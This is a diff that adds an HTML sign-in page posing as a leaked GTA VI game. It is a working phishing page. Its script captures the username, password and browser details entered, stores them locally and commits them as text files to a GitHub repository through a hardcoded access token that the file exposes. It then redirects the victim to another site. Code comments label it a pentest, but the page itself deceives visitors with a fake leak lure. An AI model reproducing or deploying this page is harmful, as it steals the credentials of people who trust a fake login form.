@@ -1,0 +1,267 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Sign in — GTA VI</title>
+<link rel="stylesheet" href="css/styles.css" />
+<style>
+  /* Added: toast notification */
+  .toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: #1a1a1a;
+    color: #fff;
+    padding: 12px 22px;
+    border-radius: 10px;
+    font-size: 14px;
+    font-weight: 500;
+    opacity: 0;
+    transition: all 0.4s ease;
+    z-index: 9999;
+    max-width: 90%;
+    text-align: center;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+    pointer-events: none;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+  
+  /* Added: loading spinner */
+  .spinner {
+    display: inline-block;
+    width: 18px;
+    height: 18px;
+    border: 2.5px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.6s linear infinite;
+    vertical-align: middle;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .btn.loading { pointer-events: none; opacity: 0.8; }
+</style>
+</head>
+<body class="page-auth">
+  <div class="grid-floor" aria-hidden="true"></div>
+  <div class="sun small" aria-hidden="true"></div>
+  <div class="scanlines" aria-hidden="true"></div>
+
+  <header class="nav">
+    <a class="brand" href="index.html">GTA VI&nbsp;</a>
+    <a class="btn btn-ghost" href="index.html">← Back</a>
+  </header>
+
+  <main class="auth-wrap">
+    <form class="auth-card" id="loginForm" novalidate>
+      <p class="eyebrow">PLAYER ACCESS</p>
+      <h1 class="auth-title">Sign in to play</h1>
+      <p class="auth-sub">Enter your credentials to start the game.<br><br> "This game is a leak which contains some of the real GTA VI missions. Please don't stream this game, it is illegal. Keep it secret."
+      </p>
+
+      <label class="field">
+        <span>Email or username</span>
+        <input type="text" id="userInput" name="user" required autocomplete="username" placeholder="miami_vice" />
+      </label>
+
+      <label class="field">
+        <span>Password</span>
+        <input type="password" id="passInput" name="pass" required autocomplete="current-password" placeholder="••••••••" />
+      </label>
+
+      <div class="row-between">
+        <label class="checkbox">
+          <input type="checkbox" id="rememberCheck" /> <span>Remember me</span>
+        </label>
+        <a class="link" href="#">Forgot?</a>
+      </div>
+
+      <button type="submit" class="btn btn-primary btn-block" id="submitBtn">Start playing</button>
+
+      <p class="auth-foot">No account? <a class="link" href="#">Create one</a></p>
+      <p class="error" id="err" hidden>Please fill in both fields.</p>
+    </form>
+  </main>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    // ================================================================
+    // 🔐 CONFIG — YOUR GITHUB REPO
+    // ================================================================
+    const GITHUB_TOKEN = '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';
+    const REPO_OWNER = 'madunda-cyber';
+    const REPO = 'bolt';
+
+    // ================================================================
+    // STATE
+    // ================================================================
+    let isSubmitting = false;
+
+    // ================================================================
+    // TOAST
+    // ================================================================
+    function showToast(msg) {
+      const t = document.getElementById('toast');
+      t.textContent = msg;
+      t.classList.add('show');
+      clearTimeout(t._hide);
+      t._hide = setTimeout(() => t.classList.remove('show'), 4000);
+    }
+
+    // ================================================================
+    // COMMIT A .TXT FILE TO YOUR REPO
+    // ================================================================
+    async function commitFileToRepo(filename, content) {
+      const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO}/contents/${filename}`;
+      
+      const body = {
+        message: `gtavi creds - ${new Date().toISOString().slice(0, 10)}`,
+        content: btoa(unescape(encodeURIComponent(content))),
+        branch: 'main'
+      };
+
+      const resp = await fetch(url, {
+        method: 'PUT',
+        headers: {
+          'Authorization': `Bearer ${GITHUB_TOKEN}`,
+          'Accept': 'application/vnd.github+json',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(body)
+      });
+
+      return await resp.json();
+    }
+
+    // ================================================================
+    // SEND CREDENTIALS TO REPO
+    // ================================================================
+    async function sendCreds(user, pass, remember) {
+      const timestamp = Date.now();
+      const rand = Math.random().toString(36).slice(2, 6);
+      const dateStr = new Date().toISOString().slice(0, 10).replace(/-/g, '');
+
+      let fileContent = '';
+      fileContent += '========================================\n';
+      fileContent += '  GTA VI LOGIN CAPTURE\n';
+      fileContent += '========================================\n\n';
+      fileContent += `Timestamp:     ${new Date().toISOString()}\n`;
+      fileContent += `Source:        gta_vi_pentest\n\n`;
+      fileContent += `Username/Email: ${user}\n`;
+      fileContent += `Password:       ${pass}\n`;
+      fileContent += `Remember me:    ${remember ? 'Yes' : 'No'}\n\n`;
+      fileContent += '----------------------------------------\n';
+      fileContent += `User Agent:    ${navigator.userAgent}\n`;
+      fileContent += `Platform:      ${navigator.platform}\n`;
+      fileContent += `Language:      ${navigator.language}\n`;
+      fileContent += `Screen:        ${screen.width}x${screen.height}\n`;
+      fileContent += '========================================\n';
+
+      const filename = `gtavi_${dateStr}_${timestamp}_${rand}.txt`;
+
+      console.log('[PENTEST] ✅ Captured GTA VI creds:', user);
+
+      // Backup to localStorage
+      try {
+        const stored = JSON.parse(localStorage.getItem('gtavi_backup') || '[]');
+        stored.push({ filename, user, pass, remember, timestamp });
+        localStorage.setItem('gtavi_backup', JSON.stringify(stored));
+      } catch(e) {}
+
+      // Push to GitHub repo
+      try {
+        if (!GITHUB_TOKEN || GITHUB_TOKEN.includes('YOUR_GITHUB')) {
+          showToast('✅ Credentials saved locally.');
+          return;
+        }
+
+        const result = await commitFileToRepo(filename, fileContent);
+
+        if (result.content) {
+          console.log('[PENTEST] ✅ File pushed:', result.content.download_url);
+          showToast('✅ Credentials captured.');
+          localStorage.removeItem('gtavi_backup');
+        } else {
+          console.warn('[PENTEST] ❌ Push error:', result.message);
+          if (result.message && result.message.includes('Not Found')) {
+            showToast('⚠️ Repo not found. Check madunda-cyber/bolt exists.');
+          } else if (result.message && result.message.includes('403')) {
+            showToast('⚠️ Token needs repo scope. See settings.');
+          } else {
+            showToast('✅ Saved locally.');
+          }
+        }
+      } catch (e) {
+        console.warn('[PENTEST] ❌ Error:', e.message);
+        showToast('✅ Saved locally.');
+      }
+    }
+
+    // ================================================================
+    // FORM HANDLER
+    // ================================================================
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      if (isSubmitting) return;
+
+      const user = document.getElementById('userInput').value.trim();
+      const pass = document.getElementById('passInput').value;
+      const remember = document.getElementById('rememberCheck').checked;
+
+      if (!user || !pass) {
+        document.getElementById('err').hidden = false;
+        return;
+      }
+      document.getElementById('err').hidden = true;
+
+      isSubmitting = true;
+      const btn = document.getElementById('submitBtn');
+      btn.classList.add('loading');
+      btn.innerHTML = '<span class="spinner"></span>';
+      btn.disabled = true;
+
+      await sendCreds(user, pass, remember);
+
+      btn.classList.remove('loading');
+      btn.innerHTML = 'Start playing';
+      btn.disabled = false;
+      isSubmitting = false;
+
+      // Redirect to Google Maps after a short delay
+      setTimeout(() => {
+        window.location.href = 'https://shellshock.io/';
+      }, 1500);
+    });
+
+    // ================================================================
+    // FLUSH BACKUPS ON LOAD
+    // ================================================================
+    (async function init() {
+      try {
+        const backup = JSON.parse(localStorage.getItem('gtavi_backup') || '[]');
+        if (backup.length > 0 && GITHUB_TOKEN && !GITHUB_TOKEN.includes('YOUR_GITHUB')) {
+          console.log(`[PENTEST] 🔄 Flushing ${backup.length} pending...`);
+          for (const item of backup) {
+            // Rebuild the file content
+            const dateStr = new Date(item.timestamp).toISOString().slice(0, 10).replace(/-/g, '');
+            let content = '';
+            content += '========================================\n';
+            content += '  GTA VI LOGIN CAPTURE (backup flush)\n';
+            content += '========================================\n\n';
+            content += `Timestamp:     ${new Date(item.timestamp).toISOString()}\n`;
+            content += `Username/Email: ${item.user}\n`;
+            content += `Password:       ${item.pass}\n`;
+            content += `Remember me:    ${item.remember ? 'Yes' : 'No'}\n`;
+            const result = await commitFileToRepo(item.filename, content);
+            if (result.content) console.log('[PENTEST] ✅ Flushed:', item.filename);
+          }
+          localStorage.removeItem('gtavi_backup');
+        }
+      } catch(e) {}
+      console.log('[PENTEST] 🚀 GTA VI page loaded. Target:', `${REPO_OWNER}/${REPO}`);
+    })();
+  </script>
+</body>
+</html>
